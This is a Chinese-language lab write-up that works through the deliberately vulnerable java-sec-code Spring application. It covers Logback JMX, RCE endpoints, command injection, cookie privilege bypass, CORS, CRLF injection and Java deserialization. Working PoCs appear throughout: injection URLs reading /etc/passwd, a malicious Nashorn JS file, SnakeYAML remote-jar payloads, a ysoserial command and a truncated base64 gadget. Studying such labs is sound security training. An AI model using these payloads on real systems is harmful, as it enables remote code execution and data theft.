CSRF Deserialize Fastjson Java RMI JSONP POI-OOXML XXE SQLI SSRF SSTI URL whitelist Bypass XXE JWT Others Logback.xml src/main/resources/logback-online.xml\nxml\r1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;configuration\u0026gt; \u0026lt;!-- logback 配置文件标签 --\u0026gt; \u0026lt;appender name=\u0026#34;STDOUT\u0026#34; class=\u0026#34;ch.qos.logback.core.ConsoleAppender\u0026#34;\u0026gt; \u0026lt;!-- 控制台输出标签 --\u0026gt; \u0026lt;withJansi\u0026gt;true\u0026lt;/withJansi\u0026gt; \u0026lt;!-- Jansi 是一个 Java 库，用来支持彩色日志输出 --\u0026gt; \u0026lt;encoder\u0026gt; \u0026lt;!-- 输出格式标签 --\u0026gt; \u0026lt;pattern\u0026gt;[%thread] %highlight(%-5level) %cyan(%logger{15}) - %msg %n\u0026lt;/pattern\u0026gt; \u0026lt;!-- 输出格式 --\u0026gt; \u0026lt;/encoder\u0026gt; \u0026lt;/appender\u0026gt; \u0026lt;root level=\u0026#34;info\u0026#34;\u0026gt; \u0026lt;!-- 根标签 --\u0026gt; \u0026lt;appender-ref ref=\u0026#34;STDOUT\u0026#34; /\u0026gt; \u0026lt;!-- 引用控制台输出标签 --\u0026gt; \u0026lt;/root\u0026gt; \u0026lt;jmxConfigurator/\u0026gt; \u0026lt;!-- 暴露 Logback 的运行时配置能力（开启 JMX 管理功能） --\u0026gt; \u0026lt;/configuration\u0026gt; 漏洞产生原因：\n\u0026lt;jmxConfigurator/\u0026gt;\n作用：暴露 Logback 的运行时配置能力（开启 JMX 管理功能）\n这个配置会注册一个 JMX MBean （可以远程管理的 Java 对象 ，“遥控器”），它允许用户通过 JMX 控制台、Jolokia （Jolokia 是一个用来访问远程 JMX MBeans 的方法，Jolokia 通过 HTTP 访问 JMX）等远程管理工具调用 Logback 的方法\n如果系统部署中 暴露了 Jolokia 的 /jolokia 接口，攻击者可以远程调用 Logback 的 reloadByURL 方法，加载恶意配置文件，进而发起 JNDI 注入 ➜ 远程代码执行（RCE）\n漏洞利用：\ntext\r1 http://localhost:8081/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/127.0.0.1:8888!/xxx.xml /jolokia/exec/：Jolokia 的 exec 调用路径\nch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator：Logback 中添加 \u0026lt;jmxConfigurator/\u0026gt; 注册 JMX MBean 后的默认名称\n/reloadByURL/：调用的 JMX 方法，即 reloadByURL(URL configFile)，运行后重新加载 Logback 配置文件\nhttp:!/!/127.0.0.1:8888!/xxx.xml：注意 !/!/ 是 URL 编码中对 / 和 : 的绕过手法，最后解析成：\ntext\r1 http://127.0.0.1:8888/xxx.xml Rce.java src/main/java/org/joychou/controller/Rce.java\n1./runtime/exec java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 public class Rce { @GetMapping(\u0026#34;/runtime/exec\u0026#34;) public String CommandExec(String cmd) {//接收 cmd 参数 Runtime run = Runtime.getRuntime();//获取当前 JVM 的 RunTime 对象，通过它可以调用 exec 命令 StringBuilder sb = new StringBuilder();//接收输出结果 try { Process p = run.exec(cmd);//执行 cmd 命令 BufferedInputStream in = new BufferedInputStream(p.getInputStream()); BufferedReader inBr = new BufferedReader(new InputStreamReader(in)); String tmpStr; while ((tmpStr = inBr.readLine()) != null) { sb.append(tmpStr); } 没有进行过滤，产生了rce 漏洞\n漏洞利用：\nPOC：/rce/runtime/exec?cmd=calc.exe\n可以弹出计算机\nPOC：/rce/runtime/exec?cmd=whoami\n2./ProcessBuilder java\r1 2 3 4 5 6 7 8 9 10 11 12 @GetMapping(\u0026#34;/ProcessBuilder\u0026#34;) public String processBuilder(String cmd) {//接收输入的 cmd StringBuilder sb = new StringBuilder(); try { String[] arrCmd = {\u0026#34;/bin/sh\u0026#34;, \u0026#34;-c\u0026#34;, cmd};//将 cmd 直接拼接到 shell 环境 ProcessBuilder processBuilder = new ProcessBuilder(arrCmd); Process p = processBuilder.start();//触发命令执行 BufferedInputStream in = new BufferedInputStream(p.getInputStream()); BufferedReader inBr = new BufferedReader(new InputStreamReader(in)); String tmpStr; 这一漏洞需要在Linux环境中复现\n3./jscmd java\r1 2 3 4 5 6 7 8 9 10 11 @GetMapping(\u0026#34;/jscmd\u0026#34;) // 定义GET请求端点 public void jsEngine(String jsurl) throws Exception { // 接收jsurl参数 // 获取JavaScript引擎（Nashorn） ScriptEngine engine = new ScriptEngineManager().getEngineByName(\u0026#34;js\u0026#34;); // 获取当前引擎的作用域绑定 Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE); // 构造加载远程JS的命令 String cmd = String.format(\u0026#34;load(\\\u0026#34;%s\\\u0026#34;)\u0026#34;, jsurl); // 执行加载命令 engine.eval(cmd, bindings); } 直接使用用户输入的jsurl构造load()命令 无任何安全过滤 漏洞利用：\n因为是基于Java的Nashorn JavaScript引擎，接受一个外部JS文件URL（jsurl），然后通过load()函数去加载执行远程的JS代码，如果远程JS包含恶意代码（比如调用Java的Runtime.exec执行系统命令），就会造成远程命令执行（RCE）漏洞。\n先编写一个恶意的JS文件\njs\r1 2 3 4 5 6 7 8 9 10 // zz.js var a = mainOutput(); function mainOutput() { // Windows打开计算器命令 var cmd = \u0026#34;calc.exe\u0026#34;; // 执行系统命令 var Runtime = Java.type(\u0026#34;java.lang.Runtime\u0026#34;); Runtime.getRuntime().exec(cmd); } 放入C盘\n用Python自带的简易HTTP服务器快速启动\ncmd\r1 2 cd C:\\malicious python -m http.server 8000 现在本地就有了一个HTTP服务器，远程JS脚本的URL就是：\ntext\r1 http://localhost:8000/zz.js POC：\ntext\r1 http://127.0.0.1:8081/rce/jscmd?jsurl=http://localhost:8000/zz.js 成功弹出计算器\nHTTP访问日志：\n4./vuln/yarm Java\r1 2 3 4 5 6 7 8 9 10 11 12 13 @GetMapping(\u0026#34;/vuln/yarm\u0026#34;) public void yarm(String content) { //使用默认构造方法创建一个 SnakeYAML 的解析器。这个构造器会使用默认的 Constructor，允许加载 Java 对象，存在安全风险。 Yaml y = new Yaml(); //这里把传入的 content 作为 YAML 输入进行解析，如果内容里构造了特殊的 Java 对象，就可能会被反序列化并执行代码，形成 RCE y.load(content); } @GetMapping(\u0026#34;/sec/yarm\u0026#34;) public void secYarm(String content) { Yaml y = new Yaml(new SafeConstructor()); y.load(content); } YAML 反序列化漏洞 ,利用 SnakeYAML 默认构造器（反序列化）+ JDK 类加载机制，达到远程代码执行（RCE） 的攻击。\n攻击核心点在于：\n构造 ScriptEngineManager 并传入一个远程 URLClassLoader，从而触发恶意类加载或脚本执行。\nSnakeYaml反序列化漏洞研究:https://www.cnblogs.com/LittleHann/p/17828948.html\n这是源码中作者给出的一个poc\ntext\r1 http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]] yaml-payload.jar:https://github.com/artsploit/yaml-payload\n下载好后开始打包为 jar：\ntext\r1 2 3 javac src/artsploit/AwesomeScriptEngineFactory.java jar -cvf yaml-payload.jar -C src/ . 将打包好的文件 yaml-payload.jar 放入服务器文件夹，开启HTTP\n触发漏洞：\ntext\r1 http://127.0.0.1:8081/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://localhost:8000/yaml-payload.jar%22]]]] 5.groovy java\r1 2 3 4 5 6 7 @GetMapping(\u0026#34;groovy\u0026#34;) public void groovyshell(String content) { //GroovyShell 是 Groovy 提供的脚本解释器，可以在 Java 程序中动态执行 Groovy 代码 GroovyShell groovyShell = new GroovyShell(); //将用户传入的脚本内容作为 Groovy 代码,立即执行 groovyShell.evaluate(content); } POC:\ntext\r1 rce/groovy?content=\u0026#34;calc\u0026#34;.execute() 命令注入-Cmd Inject 源码位置：src/main/java/org/joychou/controller/CommandInject.java\n1./codeinject Java\r1 2 3 4 5 6 7 8 9 @GetMapping(\u0026#34;/codeinject\u0026#34;) public String codeInject(String filepath) throws IOException {//GET 请求，接收 filepath 参数 //String[] cmdList = new String[]{\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;ls -la \u0026#34; + filepath}; String[] cmdList = new String[]{\u0026#34;cmd.exe\u0026#34;, \u0026#34;/c\u0026#34;, \u0026#34;dir \u0026#34; + filepath};//启动 cmd ，/c 执行后关闭终端，dir filepath 列出指定路径下的文件和目录；此处直接拼接了用户输入，存在 RCE 漏洞。 ProcessBuilder builder = new ProcessBuilder(cmdList);//使用上面构建的命令数组创建进程 builder.redirectErrorStream(true);//将标准错误流（stderr）合并到标准输出流（stdout），方便统一读取 Process process = builder.start();//启动进程，执行命令 return WebUtils.convertStreamToString(process.getInputStream());//获取命令执行后的标准输出流 } Java\r1 2 3 4 5 6 7 8 9 10 public ProcessBuilder(String... command) { this.command = new ArrayList\u0026lt;\u0026gt;(command.length); for (String arg : command) this.command.add(arg); } public ProcessBuilder redirectErrorStream(boolean redirectErrorStream) { this.redirectErrorStream = redirectErrorStream; return this; } 漏洞利用：\ntext\r1 2 3 4 http://127.0.0.1:8081/codeinject?filepath=.%26calc.exe http://127.0.0.1:8081/codeinject?filepath=.%26ipconfig http://127.0.0.1:8081/codeinject?filepath=.%26whoami http://127.0.0.1:8081/codeinject?filepath=%7Cwhoami 注意将符号进行 url 编码 \u0026amp; - .%26 - 拼接cmd命令 | - %7C - 执行多条命令 Linux：\ntext\r1 http://localhost:8080/codeinject?filepath=/tmp;cat /etc/passwd 2./codeinject/host java\r1 2 3 4 5 6 7 8 9 10 11 @GetMapping(\u0026#34;/codeinject/host\u0026#34;) public String codeInjectHost(HttpServletRequest request) throws IOException { String host = request.getHeader(\u0026#34;host\u0026#34;); logger.info(host); String[] cmdList = new String[]{\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;curl \u0026#34; + host}; ProcessBuilder builder = new ProcessBuilder(cmdList); builder.redirectErrorStream(true); Process process = builder.start(); return WebUtils.convertStreamToString(process.getInputStream()); } 注入参数为http请求头中的host参数，将host参数修改为 payload：localhost\u0026amp;ipconfig，执行命令\nBUG: Codeinject的host部分由于pom.xml更新了tomcat 版本导致打不通:\nhttps://github.com/JoyChou93/java-sec-code/issues/78\n3./codeinject/sec java\r1 2 3 4 5 6 7 8 9 10 11 12 @GetMapping(\u0026#34;/codeinject/sec\u0026#34;) public String codeInjectSec(String filepath) throws IOException { String filterFilePath = SecurityUtil.cmdFilter(filepath);//调用了自定义的安全类 if (null == filterFilePath) {//如果 cmdFilter 方法返回 null ，进行拦截 return \u0026#34;Bad boy. I got u.\u0026#34;; } String[] cmdList = new String[]{\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;ls -la \u0026#34; + filterFilePath};//Linux 下的 shell 命令 ProcessBuilder builder = new ProcessBuilder(cmdList); builder.redirectErrorStream(true); Process process = builder.start(); return WebUtils.convertStreamToString(process.getInputStream()); } java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 public class SecurityUtil { private static final Pattern FILTER_PATTERN = Pattern.compile(\u0026#34;^[a-zA-Z0-9_/\\\\.-]+$\u0026#34;); private final static Logger logger = LoggerFactory.getLogger(SecurityUtil.class); ... public static String cmdFilter(String input) { if (!FILTER_PATTERN.matcher(input).matches()) { return null; } return input; } ... } \u0026quot;^[a-zA-Z0-9_/\\\\.-]+$\u0026quot;:\n^ 和 $：表示整个字符串必须从头到尾都符合中间的规则。\n[a-zA-Z0-9_/\\\\.-]+：\na-zA-Z0-9：大小写字母和数字\n_：允许下划线\n/：允许正斜杠（路径分隔符）\n.：允许点号（如隐藏文件、扩展名）\n-：允许减号\n可以过滤的威胁：\n;, \u0026amp;, |, $, \\（除路径分隔符）, *, 空格、换行、引号等 cookies越权 src/main/java/org/joychou/controller/Cookies.java\nJava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 package org.joychou.controller; import org.springframework.web.bind.annotation.CookieValue; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RequestMapping; import javax.servlet.http.Cookie; import javax.servlet.http.HttpServletRequest; import org.joychou.util.WebUtils; import org.springframework.web.bind.annotation.RestController; import static org.springframework.web.util.WebUtils.getCookie; /** * 某些应用获取用户身份信息可能会直接从cookie中直接获取明文的nick或者id，导致越权问题。 */ @RestController @RequestMapping(\u0026#34;/cookie\u0026#34;) public class Cookies { //表示 Cookie 中用于表示用户昵称的键 private static String NICK = \u0026#34;nick\u0026#34;; @GetMapping(value = \u0026#34;/vuln01\u0026#34;) public String vuln01(HttpServletRequest req) { //调用 getCookieValueByName 方法获取 cookie 中的 nick 值 String nick = WebUtils.getCookieValueByName(req, NICK); // key code return \u0026#34;Cookie nick: \u0026#34; + nick; } /* public class WebUtils { ... public static String getCookieValueByName(HttpServletRequest request, String cookieName) { Cookie cookie = org.springframework.web.util.WebUtils.getCookie(request, cookieName); return cookie == null ? null : cookie.getValue(); } ... } */ @GetMapping(value = \u0026#34;/vuln02\u0026#34;) public String vuln02(HttpServletRequest req) { String nick = null; Cookie[] cookie = req.getCookies(); if (cookie != null) { //调用 getCookie 方法获取 cookie 中的 nick 值 nick = getCookie(req, NICK).getValue(); // key code } return \u0026#34;Cookie nick: \u0026#34; + nick; } /* public class WebUtils { ... public static Cookie getCookie(HttpServletRequest request, String name) { Assert.notNull(request, \u0026#34;Request must not be null\u0026#34;); Cookie[] cookies = request.getCookies(); if (cookies != null) { for(Cookie cookie : cookies) { if (name.equals(cookie.getName())) { return cookie; } } } return null; } ... } */ @GetMapping(value = \u0026#34;/vuln03\u0026#34;) public String vuln03(HttpServletRequest req) { String nick = null; Cookie cookies[] = req.getCookies(); if (cookies != null) { //遍历所有 cookie ，找 name 为 nick for (Cookie cookie : cookies) { // key code. Equals can also be equalsIgnoreCase. //equals() 是大小写敏感 if (NICK.equals(cookie.getName())) { nick = cookie.getValue(); } } } return \u0026#34;Cookie nick: \u0026#34; + nick; } @GetMapping(value = \u0026#34;/vuln04\u0026#34;) public String vuln04(HttpServletRequest req) { String nick = null; Cookie cookies[] = req.getCookies(); if (cookies != null) { for (Cookie cookie : cookies) { //使用 equalsIgnoreCase()，支持不区分大小写匹配 Cookie 名称。 if (cookie.getName().equalsIgnoreCase(NICK)) { // key code nick = cookie.getValue(); } } } return \u0026#34;Cookie nick: \u0026#34; + nick; } @GetMapping(value = \u0026#34;/vuln05\u0026#34;) //使用 Spring 注解 @CookieValue(\u0026#34;nick\u0026#34;) 自动注入名为 nick 的 cookie 值。 public String vuln05(@CookieValue(\u0026#34;nick\u0026#34;) String nick) { return \u0026#34;Cookie nick: \u0026#34; + nick; } @GetMapping(value = \u0026#34;/vuln06\u0026#34;) //和 vuln05 仅语法不同，功能完全一样。 public String vuln06(@CookieValue(value = \u0026#34;nick\u0026#34;) String nick) { return \u0026#34;Cookie nick: \u0026#34; + nick; } } 漏洞利用：\nvuln01\nhttp://127.0.0.1:8081/cookie/vuln01\n抓包改 cookie，\ntext\r1 Cookie: nick=admin; vuln02\n同 vuln01\nvuln03\n因为大小写敏感，所以要写准确的 nick\n如果不是全小写，就会被拦截\nvuln04\n不区分大小写，\nvuln05\njavascript\r1 2 3 4 5 // 伪造一个 nick=admin 的 Cookie document.cookie = \u0026#34;nick=admin; path=/\u0026#34;; // 发送请求，获取接口返回 fetch(\u0026#34;http://127.0.0.1:8081/cookie/vuln05\u0026#34;).then(res =\u0026gt; res.text()).then(text =\u0026gt; console.log(text)); vuln06\njavascript\r1 2 document.cookie = \u0026#34;nick=\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;; path=/\u0026#34;; fetch(\u0026#34;http://127.0.0.1:8081/cookie/vuln06\u0026#34;).then(res =\u0026gt; res.text()).then(text =\u0026gt; console.log(text)); Cors 跨域资源共享 CORS 详解\nhttps://www.ruanyifeng.com/blog/2016/04/cors.html\n原理与工作流程 CORS（Cross-Origin Resource Sharing）跨源资源共享，是HTML5的一个新特性，其思想是使用自定义的HTTP头部让浏览器与服务器进行沟通，它允许浏览器向跨域服务器发出XMLHttpRequest请求，从而克服AJAX只能同源使用的限制。\nCORS的基本原理是，第三方网站服务器生成访问控制策略，指导用户浏览器放宽 SOP 的限制，实现与指定的目标网站共享数据。\n相比之下，CORS较JSONP更为复杂，JSONP只能用于获取资源（即只读，类似于GET请求），而CORS支持所有类型的HTTP请求，功能完善。\nCORS具体工作流程可分为三步，\n资源服务器根据请求中Origin头返回访问控制策略(Access-Control-Allow-Origin响应头)，并在其中声明允许读取响应内容的源； 浏览器检查资源服务器在Access-Control-Allow-Origin头中声明的源，是否与请求方的源相符，如果相符合，则允许请求方脚本读取响应内容，否则不允许； CORS与CSRF的区别 一般有CORS漏洞的地方都有CSRF。\nCSRF一般使用form表单提交请求，而浏览器是不会对form表单进行同源拦截的，因为这是无响应的请求，浏览器认为无响应请求是安全的。\n浏览器的同源策略的本质是：一个域名的JS，在未经允许的情况下是不得读取另一个域名的内容，但浏览器并不阻止向另一个域名发送请求。\n相同点：都需要第三方网站；都需要借助Ajax的异步加载过程；一般都需要用户登录目标站点。\n不同点：一般CORS漏洞用于读取受害者的敏感信息，获取请求响应的内容；而CSRF则是诱使受害者点击提交表单来进行某些敏感操作，不用获取请求响应内容。\n由于代码限制不严格，会导致跨域请求伪造可以结合xss，csrf进行攻击\nsrc/main/java/org/joychou/controller/Cors.java\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 @RestController @RequestMapping(\u0026#34;/cors\u0026#34;) public class Cors { private static String info = \u0026#34;{\\\u0026#34;name\\\u0026#34;: \\\u0026#34;JoyChou\\\u0026#34;, \\\u0026#34;phone\\\u0026#34;: \\\u0026#34;18200001111\\\u0026#34;}\u0026#34;; @GetMapping(\u0026#34;/vuln/origin\u0026#34;) public String vuls1(HttpServletRequest request, HttpServletResponse response) { String origin = request.getHeader(\u0026#34;origin\u0026#34;); //后端无验证，直接将前端传来的 origin 反射回去，没有判断这个 origin 是否合法 response.setHeader(\u0026#34;Access-Control-Allow-Origin\u0026#34;, origin); // set origin from header //可以在跨域请求中携带 Cookie / Session / Authorization 这些身份凭证 response.setHeader(\u0026#34;Access-Control-Allow-Credentials\u0026#34;, \u0026#34;true\u0026#34;); // allow cookie return info; } @GetMapping(\u0026#34;/vuln/setHeader\u0026#34;) public String vuls2(HttpServletResponse response) { // 后端设置Access-Control-Allow-Origin为*的情况下，跨域的时候前端如果设置withCredentials为true会异常 response.setHeader(\u0026#34;Access-Control-Allow-Origin\u0026#34;, \u0026#34;*\u0026#34;); return info; } response.setHeader(\u0026quot;Access-Control-Allow-Origin\u0026quot;, origin); //任意网站都可以访问本网站\nresponse.setHeader(\u0026quot;Access-Control-Allow-Credentials\u0026quot;, \u0026quot;true\u0026quot;); //允许这些任意网站带上用户的 Cookie 来访问本网站\n这俩个头一起用就导致攻击者可以构造任意恶意网页，从任意网站带上 Cookie 访问本网站，获取到用户数据，造成数据泄露。\n漏洞利用：\n攻击者从 evil.com 发起跨域请求（使用前端脚本携带 Cookie 向另一个子域发请求），诱导已经在 http://127.0.0.1:8081 网站上登录的用户访问 evil.com ，而由于服务端设置了response.setHeader(\u0026quot;Access-Control-Allow-Origin\u0026quot;, origin);response.setHeader(\u0026quot;Access-Control-Allow-Credentials\u0026quot;, \u0026quot;true\u0026quot;);，所以当攻击者访问 http://127.0.0.1:8081/cors/vuln/origin 页面，服务端无过滤就会响应，使得攻击者拿到敏感信息。\ncors复现: https://blog.csdn.net/wanmiqi/article/details/119573354\nCRLFInjection 初识HTTP响应拆分攻击（CRLF Injection）\nhttps://www.anquanke.com/post/id/240014\nCRLF 指的是回车符（CR，ASCII 13，\\r，%0d）和换行符（LF，ASCII 10，\\n，%0a）的简称（\\r\\n）。在《HTTP | HTTP报文》一文中，我们可以了解到HTTP报文的结构：HTTP报文以状态行开始，跟在后面的是HTTP首部（HTTP Header），首部由多个首部字段构成，每行一个首部字段，HTTP首部后是一个空行，然后是报文主体（HTTP Body）。状态行和首部中的每行以CRLF结束，首部与主体之间由一空行分隔。或者理解为首部中每个首部字段以一个CRLF分隔，首部和主体由两个CRLF分隔。\n在HTTP协议中，HTTP Header 部分与 HTTP Body 部分是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制 HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些恶意的HTTP Header，如会话Cookie，甚至可以注入一些HTML代码。这就是CRLF注入漏洞的核心原理。\n在实际应用中，如果Web应用没有对用户输入做严格验证，便会导致攻击者可以输入一些恶意字符。攻击者一旦向请求行或首部中的字段注入恶意的CRLF，就能注入一些首部字段或报文主体，并在响应中输出，所以CRLF注入漏洞又称为HTTP响应拆分漏洞（HTTP Response Splitting），简称HRS。\nsrc/main/java/org/joychou/controller/CRLFInjection.java\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 @Controller @RequestMapping(\u0026#34;/crlf\u0026#34;) public class CRLFInjection { @RequestMapping(\u0026#34;/safecode\u0026#34;) //表示该方法直接将返回结果写入 HTTP 响应体中 @ResponseBody //接收 HttpServletRequest request: 客户端发来的请求对象，HttpServletResponse response: 用于构造响应返回给客户端。 public void crlf(HttpServletRequest request, HttpServletResponse response) { //将用户传入的 test1 作为值添加到响应头中 response.addHeader(\u0026#34;test1\u0026#34;, request.getParameter(\u0026#34;test1\u0026#34;)); //设置 test2 响应头为请求参数 test2 的值。如果该 header 已存在，将被覆盖 response.setHeader(\u0026#34;test2\u0026#34;, request.getParameter(\u0026#34;test2\u0026#34;)); //获取参数 test3 的值，赋给 author String author = request.getParameter(\u0026#34;test3\u0026#34;); //创建一个新的 Cookie，名为 test3，值为 author Cookie cookie = new Cookie(\u0026#34;test3\u0026#34;, author); //将该 Cookie 添加到响应头中 response.addCookie(cookie); } } 漏洞利用：\n构造POC：\ntext\r1 /crlf/safecode?test1=abc%0D%0ASet-Cookie:%20evil=1 正常来讲应该看到一个新的标头\ntext\r1 Set-Cookie: evil=1 我这里没有复现成功，可能是因为 tomcat 版本高自动过滤了 \\r\\n\nCSRF CSRF漏洞原理攻击与防御（非常细）-CSDN博客\n所以要被CSRF攻击，必须同时满足两个条件：\n登录受信任网站A，并在本地生成Cookie。 在不登出A的情况下，访问危险网站B。 Java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 @Controller @RequestMapping(\u0026#34;/csrf\u0026#34;) public class CSRF { @GetMapping(\u0026#34;/\u0026#34;) public String index() { return \u0026#34;form\u0026#34;; } @PostMapping(\u0026#34;/post\u0026#34;) @ResponseBody public String post() { return \u0026#34;CSRF passed.\u0026#34;; } } Deserialize Java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 package org.joychou.controller; import com.fasterxml.jackson.databind.ObjectMapper; import org.joychou.config.Constants; import org.joychou.security.AntObjectInputStream; import org.slf4j.Logger; import org.slf4j.LoggerFactory; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; import javax.servlet.http.Cookie; import javax.servlet.http.HttpServletRequest; import java.io.ByteArrayInputStream; import java.io.IOException; import java.io.InvalidClassException; import java.io.ObjectInputStream; import java.util.Base64; import static org.springframework.web.util.WebUtils.getCookie; /** * Deserialize RCE using Commons-Collections gadget. * * @author JoyChou @2018-06-14 */ @RestController @RequestMapping(\u0026#34;/deserialize\u0026#34;) public class Deserialize { protected final Logger logger = LoggerFactory.getLogger(this.getClass()); /** * java -jar ysoserial.jar CommonsCollections5 \u0026#34;open -a Calculator\u0026#34; | base64 \u0026lt;br\u0026gt; * \u0026lt;a href=\u0026#34;http://localhost:8080/deserialize/rememberMe/vuln\u0026#34;\u0026gt;http://localhost:8080/deserialize/rememberMe/vuln\u0026lt;/a\u0026gt; */ @RequestMapping(\u0026#34;/rememberMe/vuln\u0026#34;) public String rememberMeVul(HttpServletRequest request) throws IOException, ClassNotFoundException { //从请求中读取 rememberMe cookie Cookie cookie = getCookie(request, Constants.REMEMBER_ME_COOKIE); if (null == cookie) { return \u0026#34;No rememberMe cookie. Right?\u0026#34;; } //将 rememberMe cookie 中 Base64 编码的数据进行解码 String rememberMe = cookie.getValue(); byte[] decoded = Base64.getDecoder().decode(rememberMe); //将 byte[] 包装成字节输入流 ByteArrayInputStream bytes = new ByteArrayInputStream(decoded); //构造 ObjectInputStream 对象，从流中读取对象， ObjectInputStream in = new ObjectInputStream(bytes); //读取字节流中的对象，进行反序列化，若 cookie 中包含恶意类，将被执行 in.readObject(); in.close(); return \u0026#34;Are u ok?\u0026#34;; } /** * Check deserialize class using black list. \u0026lt;br\u0026gt; * Or update commons-collections to 3.2.2 or above.Serialization support for org.apache.commons.collections.functors.InvokerTransformer is disabled for security reasons.To enable it set system property \u0026#39;org.apache.commons.collections.enableUnsafeSerialization\u0026#39; to \u0026#39;true\u0026#39;,but you must ensure that your application does not de-serialize objects from untrusted sources.\u0026lt;br\u0026gt; * \u0026lt;a href=\u0026#34;http://localhost:8080/deserialize/rememberMe/security\u0026#34;\u0026gt;http://localhost:8080/deserialize/rememberMe/security\u0026lt;/a\u0026gt; */ //黑名单过滤 @RequestMapping(\u0026#34;/rememberMe/security\u0026#34;) public String rememberMeBlackClassCheck(HttpServletRequest request) throws IOException, ClassNotFoundException { Cookie cookie = getCookie(request, Constants.REMEMBER_ME_COOKIE); if (null == cookie) { return \u0026#34;No rememberMe cookie. Right?\u0026#34;; } String rememberMe = cookie.getValue(); byte[] decoded = Base64.getDecoder().decode(rememberMe); ByteArrayInputStream bytes = new ByteArrayInputStream(decoded); try {//使用自定义 AntObjectInputStream 类进行反序列化。该类内部通过黑名单机制禁止一些已知的恶意类 AntObjectInputStream in = new AntObjectInputStream(bytes); // throw InvalidClassException in.readObject(); in.close(); } catch (InvalidClassException e) { logger.info(e.toString()); return e.toString(); } return \u0026#34;I\u0026#39;m very OK.\u0026#34;; } // String payload = \u0026#34;[\\\u0026#34;org.jsecurity.realm.jndi.JndiRealmFactory\\\u0026#34;, {\\\u0026#34;jndiNames\\\u0026#34;:\\\u0026#34;ldap://30.196.97.50:1389/yto8pc\\\u0026#34;}]\u0026#34;; @RequestMapping(\u0026#34;/jackson\u0026#34;) public void Jackson(String payload) { //ObjectMapper 是 Jackson 提供的 JSON 解析器 ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); try {//反序列化用户输入的 JSON Object obj = mapper.readValue(payload, Object.class); mapper.writeValueAsString(obj); } catch (IOException e) { e.printStackTrace(); } } } 漏洞利用：\nysoserial.jar 生成 payload：\ntext\r1 2 路由： /deserialize/rememberMe/vuln text\r1 2 3 4 5 Windows： java -jar ~/ysoserial.jar CommonsCollections5 calc | base64 rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAUXQAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0c3EAfgALAAAAM3EAfgANcQB+AA5xAH4AD3NxAH4ACwAAACJ0ABl5c29zZXJpYWwuR2VuZXJhdGVQYXlsb2FkdAAUR2VuZXJhdGVQYXlsb2FkLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy